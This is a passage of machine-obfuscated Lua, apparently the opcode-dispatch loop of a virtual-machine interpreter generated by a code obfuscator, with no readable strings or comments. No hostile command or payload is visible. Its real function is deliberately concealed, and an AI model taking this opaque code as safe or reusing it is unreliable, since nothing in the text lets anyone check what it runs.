w[y[654]]=w[y[131]]+w[y[216]];elseif z==293 then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if a==0 then c=nil else w[y[654]]=w[y[131]][w[y[216]]];end else if 2<a then y=f[n];else n=n+1;end end else if a<=5 then if 4==a then w[y[654]]=w[y[131]];else n=n+1;end else if a<=6 then y=f[n];else if a<8 then w[y[654]]=y[131];else n=n+1;end end end end else if a<=13 then if a<=10 then if a>9 then w[y[654]]=y[131];else y=f[n];end else if a<=11 then n=n+1;else if 13>a then y=f[n];else w[y[654]]=y[131];end end end else if a<=15 then if 15>a then n=n+1;else y=f[n];end else if a<=16 then c=y[654]else if 18>a then w[c]=w[c](r(w,c+1,y[131]))else break end end end end end a=a+1 end else local a,c,e=0 while true do if a<=24 then if a<=11 then if a<=5 then if a<=2 then if a<=0 then c=nil else if 1<a then w[y[654]]={};else e=nil end end else if a<=3 then n=n+1;else if 5~=a then y=f[n];else w[y[654]]=h[y[131]];end end end else if a<=8 then if a<=6 then n=n+1;else if a<8 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if a<=9 then n=n+1;else if a~=11 then y=f[n];else w[y[654]]=h[y[131]];end end end end else if a<=17 then if a<=14 then if a<=12 then n=n+1;else if a==13 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if a<=15 then n=n+1;else if 17~=a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if a<=20 then if a<=18 then n=n+1;else if 19<a then w[y[654]]={};else y=f[n];end end else if a<=22 then if a<22 then n=n+1;else y=f[n];end else if 24>a then w[y[654]]={};else n=n+1;end end end end end else if a<=37 then if a<=30 then if a<=27 then if a<=25 then y=f[n];else if 26==a then w[y[654]]=h[y[131]];else n=n+1;end end else if a<=28 then y=f[n];else if a~=30 then w[y[654]][y[131]]=w[y[216]];else n=n+1;end end end else if a<=33 then if a<=31 then y=f[n];else if 33>a then w[y[654]]=h[y[131]];else n=n+1;end end else if a<=35 then if 34<a then w[y[654]][y[131]]=w[y[216]];else y=f[n];end else if a>36 then y=f[n];else n=n+1;end end end end else if a<=43 then if a<=40 then if a<=38 then w[y[654]][y[131]]=w[y[216]];else if 40>a then n=n+1;else y=f[n];end end else if a<=41 then w[y[654]]={r({},1,y[131])};else if 42<a then y=f[n];else n=n+1;end end end else if a<=46 then if a<=44 then w[y[654]]=w[y[131]];else if a>45 then y=f[n];else n=n+1;end end else if a<=48 then if 47==a then e=y[654];else c=w[e];end else if 49<a then break else for m=e+1,y[131]do t(c,w[m])end;end end end end end end a=a+1 end end;elseif(295==z or 295>z)then local a,c,e=0 while true do if a<=24 then if a<=11 then if a<=5 then if a<=2 then if a<=0 then c=nil else if a~=2 then e=nil else w[y[654]]={};end end else if a<=3 then n=n+1;else if a<5 then y=f[n];else w[y[654]]=h[y[131]];end end end else if a<=8 then if a<=6 then n=n+1;else if a>7 then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end else if a<=9 then n=n+1;else if a<11 then y=f[n];else w[y[654]]=h[y[131]];end end end end else if a<=17 then if a<=14 then if a<=12 then n=n+1;else if a~=14 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if a<=15 then n=n+1;else if 16<a then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end end else if a<=20 then if a<=18 then n=n+1;else if a>19 then w[y[654]]={};else y=f[n];end end else if a<=22 then if a<22 then n=n+1;else y=f[n];end else if a==23 then w[y[654]]={};else n=n+1;end end end end end else if a<=37 then if a<=30 then if a<=27 then if a<=25 then y=f[n];else if 26<a then n=n+1;else w[y[654]]=h[y[131]];end end else if a<=28 then y=f[n];else if a>29 then n=n+1;else w[y[654]][y[131]]=w[y[216]];end end end else if a<=33 then if a<=31 then y=f[n];else if 33~=a then w[y[654]]=h[y[131]];else n=n+1;end end else if a<=35 then if 34==a then y=f[n];else w[y[654]][y[131]]=w[y[216]];end else if a<37 then n=n+1;else y=f[n];end end end end else if a<=43 then if a<=40 then if a<=38 then w[y[654]][y[131]]=w[y[216]];else if 40>a then n=n+1;else y=f[n];end end else if a<=41 then w[y[654]]={r({},1,y[131])};else if 42==a then n=n+1;else y=f[n];end end end else if a<=46 then if a<=44 then w[y[654]]=w[y[131]];else if a~=46 then n=n+1;else y=f[n];end end else if a<=48 then if a==47 then e=y[654];else c=w[e];end else if a==49 then for m=e+1,y[131]do t(c,w[m])end;else break end end end end end end a=a+1 end elseif not(296~=z)then w[y[654]]();else w[y[654]]();end;elseif 300>=z then if z<=298 then local a;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];a=y[654]w[a]=w[a]()elseif 300~=z then local a;local c;local e;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];e=y[131];c=y[216];a=k(w,g,e,c);w[y[654]]=a;else local a;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))end;elseif 301>=z then local a;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))elseif 303>z then w[y[654]]=w[y[131]][w[y[216]]];else local a;local c;local e;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];e=y[654]c={w[e](w[e+1])};a=0;for m=e,y[216]do a=a+1;w[m]=c[a];end end;elseif z<=315 then if z<=309 then if 306>=z then if 304>=z then w[y[654]]=w[y[131]]*y[216];elseif 306~=z then local a=y[654]local c,e=i(w[a](w[a+1]))p=e+a-1 local e=0;for m=a,p do e=e+1;w[m]=c[e];end;else local a;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];a=y[654]w[a]=w[a]()end;elseif z<=307 then w[y[654]]=w[y[131]];elseif 308<z then w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];if w[y[654]]then n=n+1;else n=y[131];end;else local a=y[654]local c={w[a](r(w,a+1,y[131]))};local e=0;for m=a,y[216]do e=e+1;w[m]=c[e];end;end;elseif 312>=z then if(310==z or 310>z)then local a=y[654]local c={}for e=1,#v do local m=v[e]for q=1,#m do local m=m[q]local q,q=m[1],m[2]if(q>a or q==a)then c[q]=w[q]m[1]=c v[e]=nil;end end end elseif 312~=z then local a,c=0 while true do if a<=16 then if a<=7 then if a<=3 then if a<=1 then if 1>a then c=nil else w[y[654]]=w[y[131]][y[216]];end else if 3>a then n=n+1;else y=f[n];end end else if a<=5 then if a==4 then w[y[654]]=h[y[131]];else n=n+1;end else if a>6 then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end end else if a<=11 then if a<=9 then if a==8 then n=n+1;else y=f[n];end else if a~=11 then w[y[654]]={};else n=n+1;end end else if a<=13 then if a>12 then w[y[654]]=h[y[131]];else y=f[n];end else if a<=14 then n=n+1;else if 15<a then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end end end end else if a<=24 then if a<=20 then if a<=18 then if 18~=a then n=n+1;else y=f[n];end else if 19==a then w[y[654]]=h[y[131]];else n=n+1;end end else if a<=22 then if a~=22 then y=f[n];else w[y[654]]={};end else if a~=24 then n=n+1;else y=f[n];end end end else if a<=28 then if a<=26 then if 26~=a then w[y[654]]=h[y[131]];else n=n+1;end else if 28>a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if a<=30 then if a>29 then y=f[n];else n=n+1;end else if a<=31 then c=y[654]else if a<33 then w[c]=w[c]()else break end end end end end end a=a+1 end else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a~=1 then c=nil else w[y[654]]=h[y[131]];end else if a==2 then n=n+1;else y=f[n];end end else if a<=5 then if a==4 then w[y[654]]=y[131];else n=n+1;end else if 7~=a then y=f[n];else w[y[654]]=y[131];end end end else if a<=11 then if a<=9 then if a==8 then n=n+1;else y=f[n];end else if 10<a then n=n+1;else w[y[654]]=y[131];end end else if a<=13 then if 13>a then y=f[n];else c=y[654]end else if a>14 then break else w[c]=w[c](r(w,c+1,y[131]))end end end end a=a+1 end end;elseif z<=313 then local a,c=0 while true do if a<=14 then if a<=6 then if a<=2 then if a<=0 then c=nil else if a==1 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end else if a<=4 then if a~=4 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if a==5 then n=n+1;else y=f[n];end end end else if a<=10 then if a<=8 then if 8~=a then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if a==9 then y=f[n];else w[y[654]]=w[y[131]]*y[216];end end else if a<=12 then if a==11 then n=n+1;else y=f[n];end else if a<14 then w[y[654]]=w[y[131]]+w[y[216]];else n=n+1;end end end end else if a<=22 then if a<=18 then if a<=16 then if 15<a then w[y[654]]=j[y[131]];else y=f[n];end else if a>17 then y=f[n];else n=n+1;end end else if a<=20 then if a==19 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if a>21 then w[y[654]]=w[y[131]];else y=f[n];end end end else if a<=26 then if a<=24 then if 23<a then y=f[n];else n=n+1;end else if 25==a then w[y[654]]=w[y[131]]+w[y[216]];else n=n+1;end end else if a<=28 then if a<28 then y=f[n];else c=y[654]end else if a<30 then w[c]=w[c](r(w,c+1,y[131]))else break end end end end end a=a+1 end elseif z<315 then if(y[654]<w[y[216]])then n=n+1;else n=y[131];end;else w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];if(w[y[654]]~=w[y[216]])then n=n+1;else n=y[131];end;end;elseif z<=321 then if 318>=z then if 316>=z then local a;w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))elseif 317<z then local a;w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]][y[131]]=y[216];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))else w[y[654]]=w[y[131]]%y[216];end;elseif 319>=z then local a;w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))elseif z<321 then local a;w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]][y[131]]=y[216];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))else n=y[131];end;elseif z<=324 then if z<=322 then local a;local c;local e;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];e=y[131];c=y[216];a=k(w,g,e,c);w[y[654]]=a;elseif z>323 then w[y[654]]={r({},1,y[131])};else local a;w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))end;elseif 325>=z then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1>a then c=nil else e=nil end else if a<=2 then m=nil else if a<4 then w[y[654]]=h[y[131]];else n=n+1;end end end else if a<=6 then if 5<a then w[y[654]]=h[y[131]];else y=f[n];end else if a<=7 then n=n+1;else if a<9 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=14 then if a<=11 then if 10==a then n=n+1;else y=f[n];end else if a<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if 13==a then n=n+1;else y=f[n];end end end else if a<=16 then if 15<a then e={w[m](w[m+1])};else m=y[654]end else if a<=17 then c=0;else if a==18 then for q=m,y[216]do c=c+1;w[q]=e[c];end else break end end end end end a=a+1 end elseif z==326 then w[y[654]]=w[y[131]]+y[216];else local a;local c;local e;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];e=y[654]c={w[e](w[e+1])};a=0;for m=e,y[216]do a=a+1;w[m]=c[a];end end;elseif z<=350 then if 338>=z then if 332>=z then if 329>=z then if z~=329 then local a;local c;w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];c=y[654];a=w[y[131]];w[c+1]=a;w[c]=a[w[y[216]]];else local a;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))end;elseif 330>=z then local a;w[y[654]]=w[y[131]]%w[y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]]+y[216];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))elseif 332~=z then local a;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))else local a;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))end;elseif z<=335 then if 333>=z then w[y[654]]=true;elseif z==334 then local a;local c;local e;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];e=y[654]c={w[e](w[e+1])};a=0;for m=e,y[216]do a=a+1;w[m]=c[a];end else local a=y[654]w[a]=w[a](w[a+1])end;elseif z<=336 then if w[y[654]]then n=(n+1);else n=y[131];end;elseif 337<z then local a=y[654]w[a]=w[a](r(w,a+1,y[131]))else if(w[y[654]]~=y[216])then n=y[131];else n=n+1;end;end;elseif z<=344 then if z<=341 then if 339>=z then local a=y[654];do return w[a],w[a+1]end elseif z<341 then if(w[y[654]]~=w[y[216]])then n=n+1;else n=y[131];end;else w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];for a=y[654],y[131],1 do w[a]=nil;end;n=n+1;y=f[n];n=y[131];end;elseif z<=342 then w[y[654]][y[131]]=w[y[216]];elseif z~=344 then w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];if(w[y[654]]~=y[216])then n=n+1;else n=y[131];end;else w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];n=y[131];end;elseif z<=347 then if 345>=z then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a==0 then c=nil else w[y[654]]=h[y[131]];end else if 2==a then n=n+1;else y=f[n];end end else if a<=5 then if 5>a then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if a<7 then y=f[n];else w[y[654]]=y[131];end end end else if a<=11 then if a<=9 then if a>8 then y=f[n];else n=n+1;end else if a>10 then n=n+1;else w[y[654]]=y[131];end end else if a<=13 then if a~=13 then y=f[n];else c=y[654]end else if 15>a then w[c]=w[c](r(w,c+1,y[131]))else break end end end end a=a+1 end elseif z~=347 then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=#w[y[131]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];a=y[654];w[a]=w[a]-w[a+2];n=y[131];else w[y[654]]=#w[y[131]];end;elseif z<=348 then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1>a then c=nil else e=nil end else if a<=2 then m=nil else if 3<a then n=n+1;else w[y[654]]=h[y[131]];end end end else if a<=6 then if a<6 then y=f[n];else w[y[654]]=h[y[131]];end else if a<=7 then n=n+1;else if a<9 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=14 then if a<=11 then if a~=11 then n=n+1;else y=f[n];end else if a<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if a<14 then n=n+1;else y=f[n];end end end else if a<=16 then if a~=16 then m=y[654]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if 19~=a then for q=m,y[216]do c=c+1;w[q]=e[c];end else break end end end end end a=a+1 end elseif z>349 then w[y[654]]=w[y[131]]%w[y[216]];else w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];if w[y[654]]then n=n+1;else n=y[131];end;end;elseif 362>=z then if 356>=z then if(353>=z)then if(351>=z)then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1>a then c=nil else e=nil end else if a<=2 then m=nil else if 4>a then w[y[654]]=h[y[131]];else n=n+1;end end end else if a<=6 then if 6~=a then y=f[n];else w[y[654]]=h[y[131]];end else if a<=7 then n=n+1;else if 9~=a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=14 then if a<=11 then if 11~=a then n=n+1;else y=f[n];end else if a<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if 13==a then n=n+1;else y=f[n];end end end else if a<=16 then if a==15 then m=y[654]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if a<19 then for q=m,y[216]do c=c+1;w[q]=e[c];end else break end end end end end a=a+1 end elseif not(353==z)then local a,c,e=0 while true do if a<=9 then if a<=4 then if a<=1 then if a==0 then c=nil else e=nil end else if a<=2 then w={};else if a<4 then for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;else n=n+1;end end end else if a<=6 then if a>5 then w[y[654]]=j[y[131]];else y=f[n];end else if a<=7 then n=n+1;else if a>8 then w[y[654]]=j[y[131]];else y=f[n];end end end end else if a<=14 then if a<=11 then if 11~=a then n=n+1;else y=f[n];end else if a<=12 then w[y[654]]=w[y[131]][y[216]];else if a>13 then y=f[n];else n=n+1;end end end else if a<=16 then if a~=16 then e=y[654];else c=w[y[131]];end else if a<=17 then w[e+1]=c;else if a~=19 then w[e]=c[y[216]];else break end end end end end a=a+1 end else local a,c=0 while true do if a<=12 then if a<=5 then if a<=2 then if a<=0 then c=nil else if 2~=a then w={};else for e=0,u,1 do if e<o then w[e]=s[e+1];else break;end;end;end end else if a<=3 then n=n+1;else if 4==a then y=f[n];else w[y[654]]=h[y[131]];end end end else if a<=8 then if a<=6 then n=n+1;else if a<8 then y=f[n];else w[y[654]]=j[y[131]];end end else if a<=10 then if 10>a then n=n+1;else y=f[n];end else if 12~=a then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end end else if a<=18 then if a<=15 then if a<=13 then y=f[n];else if 15~=a then w[y[654]]=y[131];else n=n+1;end end else if a<=16 then y=f[n];else if 17==a then w[y[654]]=y[131];else n=n+1;end end end else if a<=21 then if a<=19 then y=f[n];else if 21>a then w[y[654]]=y[131];else n=n+1;end end else if a<=23 then if a~=23 then y=f[n];else c=y[654]end else if a>24 then break else w[c]=w[c](r(w,c+1,y[131]))end end end end end a=a+1 end end;elseif(354>=z)then local a,c=0 while true do if a<=10 then if a<=4 then if a<=1 then if a~=1 then c=nil else w[y[654]]=w[y[131]][y[216]];end else if a<=2 then n=n+1;else if a==3 then y=f[n];else w[y[654]]=h[y[131]];end end end else if a<=7 then if a<=5 then n=n+1;else if 7~=a then y=f[n];else w[y[654]]=h[y[131]];end end else if a<=8 then n=n+1;else if 9<a then w[y[654]]=h[y[131]];else y=f[n];end end end end else if a<=15 then if a<=12 then if 11==a then n=n+1;else y=f[n];end else if a<=13 then w[y[654]]=h[y[131]];else if 15>a then n=n+1;else y=f[n];end end end else if a<=18 then if a<=16 then w[y[654]]=w[y[131]];else if a~=18 then n=n+1;else y=f[n];end end else if a<=19 then c=y[654]else if 20<a then break else w[c](r(w,c+1,y[131]))end end end end end a=a+1 end elseif 355<z then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 1>a then c=nil else w[y[654]]=j[y[131]];end else if 3~=a then n=n+1;else y=f[n];end end else if a<=5 then if a>4 then n=n+1;else w[y[654]]=w[y[131]][y[216]];end else if a==6 then y=f[n];else w[y[654]]=h[y[131]];end end end else if a<=11 then if a<=9 then if 8<a then y=f[n];else n=n+1;end else if a~=11 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end else if a<=13 then if a<13 then y=f[n];else c=y[654]end else if a<15 then w[c]=w[c](w[c+1])else break end end end end a=a+1 end else local a,c=0 while true do if a<=13 then if a<=6 then if a<=2 then if a<=0 then c=nil else if 2~=a then w[y[654]]={};else n=n+1;end end else if a<=4 then if 3==a then y=f[n];else w[y[654]]=h[y[131]];end else if 6>a then n=n+1;else y=f[n];end end end else if a<=9 then if a<=7 then w[y[654]]=w[y[131]][y[216]];else if a<9 then n=n+1;else y=f[n];end end else if a<=11 then if 10==a then w[y[654]][y[131]]=w[y[216]];else n=n+1;end else if a~=13 then y=f[n];else w[y[654]]=j[y[131]];end end end end else if a<=20 then if a<=16 then if a<=14 then n=n+1;else if 16~=a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if a<=18 then if 18>a then n=n+1;else y=f[n];end else if 19==a then w[y[654]]=j[y[131]];else n=n+1;end end end else if a<=23 then if a<=21 then y=f[n];else if 22<a then n=n+1;else w[y[654]]=w[y[131]][y[216]];end end else if a<=25 then if a<25 then y=f[n];else c=y[654]end else if a<27 then w[c]=w[c]()else break end end end end end a=a+1 end end;elseif z<=359 then if z<=357 then local a;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];a=y[654]w[a]=w[a](w[a+1])elseif z==358 then local a;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))else w[y[654]]=#w[y[131]];end;elseif 360>=z then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1~=a then c=nil else e=nil end else if a<=2 then m=nil else if a>3 then n=n+1;else w[y[654]]=j[y[131]];end end end else if a<=6 then if 5<a then w[y[654]]=w[y[131]][y[216]];else y=f[n];end else if a<=7 then n=n+1;else if 8==a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=14 then if a<=11 then if 11~=a then n=n+1;else y=f[n];end else if a<=12 then w[y[654]]=w[y[131]][y[216]];else if 14~=a then n=n+1;else y=f[n];end end end else if a<=16 then if a>15 then e={w[m](w[m+1])};else m=y[654]end else if a<=17 then c=0;else if a~=19 then for o=m,y[216]do c=c+1;w[o]=e[c];end else break end end end end end a=a+1 end elseif z==361 then if(w[y[654]]<w[y[216]])then n=n+1;else n=y[131];end;else w[y[654]][y[131]]=y[216];end;elseif z<=368 then if 365>=z then if z<=363 then if(w[y[654]]~=w[y[216]])then n=n+1;else n=y[131];end;elseif z~=365 then local a;local c,e;local m;w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654]c,e=i(w[m](r(w,m+1,y[131])))p=e+m-1 a=0;for e=m,p do a=a+1;w[e]=c[a];end;else w[y[654]]=b(d[y[131]],nil,j);end;elseif 366>=z then local a=y[654]w[a]=w[a](w[a+1])elseif 367==z then local a=y[654]w[a](r(w,a+1,y[131]))else local a;w[y[654]]={};n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];a=y[654]w[a]=w[a]()end;elseif z<=371 then if z<=369 then local a;local c;local e;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];e=y[654]c={w[e](w[e+1])};a=0;for i=e,y[216]do a=a+1;w[i]=c[a];end elseif 371>z then local a;local c;local e;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];e=y[654]c={w[e](w[e+1])};a=0;for i=e,y[216]do a=a+1;w[i]=c[a];end else w[y[654]]=b(d[y[131]],nil,j);end;elseif 372>=z then local a;local c;local 